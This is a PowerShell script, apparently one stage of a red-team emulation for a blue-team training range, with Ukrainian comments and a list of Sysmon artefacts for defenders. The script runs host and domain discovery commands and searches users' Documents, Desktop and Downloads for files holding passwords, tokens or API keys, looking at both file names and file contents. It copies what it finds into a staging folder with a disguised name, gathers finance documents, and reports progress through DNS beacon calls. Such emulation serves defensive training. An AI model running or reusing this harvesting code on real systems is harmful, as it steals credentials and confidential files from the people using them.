# =============================================================================
# Block 2: Discovery & Credential Harvesting для навчання заборонено використовувати в оц
# EXERCISE ONLY — CyberRanges blue team training
# =============================================================================
# Що робить:
#   1. Збирає інфо про систему (whoami, hostname, ipconfig, net user)
#   2. Збирає інфо про домен (net group, net view)
#   3. Шукає файли з паролями (по назві + по вмісту)
# Артефакти для blue team:
#   - Sysmon EID 1  : whoami.exe, net.exe, ipconfig.exe, systeminfo.exe
#   - Sysmon EID 11 : sysinfo.txt, creds\ в %TEMP%
# =============================================================================

$BLOCK_TAG = "B2"
$LogPath   = "C:\ProgramData\upd_logs\block2.log"
. "$PSScriptRoot\config.ps1"

# ── Пошук в середині TXT/CSV ──────────────────────────────────────────────────
function Search-TextContent {
    param([string]$FilePath, [string[]]$Keywords)
    try {
        $content = Get-Content -Path $FilePath -Encoding UTF8 -ErrorAction Stop
        foreach ($kw in $Keywords) {
            if ($content | Select-String -Pattern $kw -Quiet -CaseSensitive:$false) {
                return $true
            }
        }
    } catch {}
    return $false
}

# ── Пошук в середині DOCX ────────────────────────────────────────────────────
function Search-DocxContent {
    param([string]$FilePath, [string[]]$Keywords)
    try {
        # DOCX = ZIP архів → читаємо word/document.xml
        $zip  = [System.IO.Compression.ZipFile]::OpenRead($FilePath)
        $entry = $zip.Entries | Where-Object { $_.FullName -eq "word/document.xml" }
        if ($entry) {
            $stream = $entry.Open()
            $reader = New-Object System.IO.StreamReader($stream)
            $xml    = $reader.ReadToEnd()
            $reader.Close()
            $zip.Dispose()

            # Прибираємо XML теги → чистий текст
            $text = $xml -replace '<[^>]+>', ' '
            foreach ($kw in $Keywords) {
                if ($text -match $kw) { return $true }
            }
        } else {
            $zip.Dispose()
        }
    } catch {}
    return $false
}

# ── Пошук в середині XLSX ────────────────────────────────────────────────────
function Search-XlsxContent {
    param([string]$FilePath, [string[]]$Keywords)
    try {
        # XLSX = ZIP архів → читаємо xl/sharedStrings.xml
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        $zip   = [System.IO.Compression.ZipFile]::OpenRead($FilePath)
        $entry = $zip.Entries | Where-Object { $_.FullName -eq "xl/sharedStrings.xml" }
        if ($entry) {
            $stream = $entry.Open()
            $reader = New-Object System.IO.StreamReader($stream)
            $xml    = $reader.ReadToEnd()
            $reader.Close()
            $zip.Dispose()

            $text = $xml -replace '<[^>]+>', ' '
            foreach ($kw in $Keywords) {
                if ($text -match $kw) { return $true }
            }
        } else {
            $zip.Dispose()
        }
    } catch {}
    return $false
}

# =============================================================================
Write-Log "=== BLOCK 2: DISCOVERY START ==="
Invoke-DnsBeacon -Label "B2:START:$env:COMPUTERNAME"

$LOG_DIR  = "C:\ProgramData\upd_logs"
$OUT_FILE = "$LOG_DIR\sysinfo.txt"

if (-not (Test-Path $LOG_DIR)) {
    New-Item -Path $LOG_DIR -ItemType Directory -Force | Out-Null
}

# ── 1. Системна інформація ────────────────────────────────────────────────────
Write-Log "Collecting system info..."

$results  = @()
$results += "=" * 60
$results += "DISCOVERY REPORT — $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
$results += "=" * 60
$results += "`n=== WHOAMI ===";            $results += (& whoami 2>&1)
$results += "`n=== HOSTNAME ===";          $results += (& hostname 2>&1)
$results += "`n=== IPCONFIG /ALL ===";     $results += (& ipconfig /all 2>&1)
$results += "`n=== SYSTEMINFO ===";        $results += (& systeminfo 2>&1)

# ── 2. Користувачі ────────────────────────────────────────────────────────────
Write-Log "Collecting user info..."

$results += "`n=== NET USER ===";          $results += (& net user 2>&1)
$results += "`n=== NET USER /DOMAIN ===";  $results += (& net user /domain 2>&1)
$results += "`n=== NET USER CURRENT ===";  $results += (& net user $env:USERNAME 2>&1)

# ── 3. Домен ──────────────────────────────────────────────────────────────────
Write-Log "Collecting domain info..."

$results += "`n=== NET GROUP DOMAIN ADMINS ==="; $results += (& net group "Domain Admins" /domain 2>&1)
$results += "`n=== NET GROUP /DOMAIN ===";       $results += (& net group /domain 2>&1)
$results += "`n=== NET VIEW ===";                $results += (& net view 2>&1)
$results += "`n=== NET SHARE ===";               $results += (& net share 2>&1)

# ── 4. Мережа ─────────────────────────────────────────────────────────────────
Write-Log "Collecting network info..."

$results += "`n=== ARP TABLE ===";         $results += (& arp -a 2>&1)
$results += "`n=== NETSTAT ===";           $results += (& netstat -ano 2>&1)
$results += "`n=== ROUTE TABLE ===";       $results += (& route print 2>&1)

# ── 5. Процеси ────────────────────────────────────────────────────────────────
Write-Log "Collecting process list..."
$results += "`n=== RUNNING PROCESSES ==="
$results += (Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize | Out-String)

$results | Out-File -FilePath $OUT_FILE -Encoding UTF8
Write-Log "Discovery saved to: $OUT_FILE"
Invoke-DnsBeacon -Label "B2:DISCOVERY:DONE"

# =============================================================================
# ── 6. Credential Harvesting ──────────────────────────────────────────────────
# Шукає по назві файлу + по вмісту
# =============================================================================
Write-Log "Searching for credential files..."

Add-Type -AssemblyName System.IO.Compression.FileSystem

# Директорії пошуку
$search_dirs = @(
    "C:\Users\$env:USERNAME\Documents",
    "C:\Users\$env:USERNAME\Desktop",
    "C:\Users\$env:USERNAME\Downloads"
)

# Ключові слова в НАЗВІ файлу
$name_keywords = @(
    "*password*","*passwd*","*cred*",
    "*login*","*account*","*secret*","*access*"
)

# Ключові слова всередині ВМІСТУ
$content_keywords = @(
    "password","passwd","username",
    "login","credential","secret",
    "token","apikey","api_key"
)

$cred_staging = "$LOG_DIR\creds"
if (-not (Test-Path $cred_staging)) {
    New-Item -Path $cred_staging -ItemType Directory -Force | Out-Null
}

$found_files = @()

foreach ($dir in $search_dirs) {
    if (-not (Test-Path $dir)) { continue }

    # Всі файли в директорії
    $all_files = Get-ChildItem -Path $dir -Recurse -ErrorAction Ignore |
        Where-Object { -not $_.PSIsContainer }

    foreach ($file in $all_files) {
        $match_reason = $null

        # ── Перевірка 1: назва файлу ─────────────────────────────────────────
        foreach ($kw in $name_keywords) {
            if ($file.Name -like $kw) {
                $match_reason = "NAME_MATCH:$kw"
                break
            }
        }

        # ── Перевірка 2: вміст файлу (якщо назва не співпала) ────────────────
        if (-not $match_reason) {
            switch ($file.Extension.ToLower()) {
                { $_ -in ".txt",".csv" } {
                    if (Search-TextContent -FilePath $file.FullName -Keywords $content_keywords) {
                        $match_reason = "CONTENT_MATCH:TXT/CSV"
                    }
                }
                ".docx" {
                    if (Search-DocxContent -FilePath $file.FullName -Keywords $content_keywords) {
                        $match_reason = "CONTENT_MATCH:DOCX"
                    }
                }
                { $_ -in ".xlsx",".xls" } {
                    if (Search-XlsxContent -FilePath $file.FullName -Keywords $content_keywords) {
                        $match_reason = "CONTENT_MATCH:XLSX"
                    }
                }
            }
        }

        # ── Якщо знайдено — копіюємо ─────────────────────────────────────────
        if ($match_reason) {
            $found_files += $file
            Copy-Item -Path $file.FullName -Destination $cred_staging -ErrorAction Ignore
            Write-Log "Found: $($file.FullName) [$match_reason]"
        }
    }
}

# Підсумок credentials
if ($found_files.Count -gt 0) {
    Write-Log "Total credential files found: $($found_files.Count)"
    Invoke-DnsBeacon -Label "B2:CREDS:FOUND:$($found_files.Count)"
} else {
    Write-Log "No credential files found" -Level "WARN"
    Invoke-DnsBeacon -Label "B2:CREDS:NOTFOUND"
}

# =============================================================================
# ── 7. Document Collection — A07 ──────────────────────────────────────────────
# Збирає .docx/.xlsx/.pdf з WS-1 → docs\ (фільтр по назві файлу)
# =============================================================================
Write-Log "Collecting finance documents from WS-1..."

$docs_dir = "$LOG_DIR\docs"
if (-not (Test-Path $docs_dir)) {
    New-Item -Path $docs_dir -ItemType Directory -Force | Out-Null
}

$doc_keywords   = @("budget","finance","payment","invoice","salary","contract","approval","report","financial","statement")
$doc_extensions = @("*.docx","*.xlsx","*.pdf")

$docs_collected = 0
foreach ($dir in $search_dirs) {
    if (-not (Test-Path $dir)) { continue }
    foreach ($ext in $doc_extensions) {
        Get-ChildItem -Path $dir -Filter $ext -Recurse -ErrorAction Ignore | ForEach-Object {
            $name_lower = $_.Name.ToLower()
            if ($doc_keywords | Where-Object { $name_lower -like "*$_*" }) {
                Copy-Item -Path $_.FullName -Destination $docs_dir -Force -ErrorAction Ignore
                $docs_collected++
                Write-Log "Doc collected [WS-1]: $($_.FullName)"
            }
        }
    }
}

Write-Log "Documents collected from WS-1: $docs_collected"
Invoke-DnsBeacon -Label "B2:DOCS:WS1:$docs_collected"

Write-Log "=== BLOCK 2: COMPLETE ==="
Invoke-DnsBeacon -Label "B2:DONE:$env:COMPUTERNAME"

return $found_files
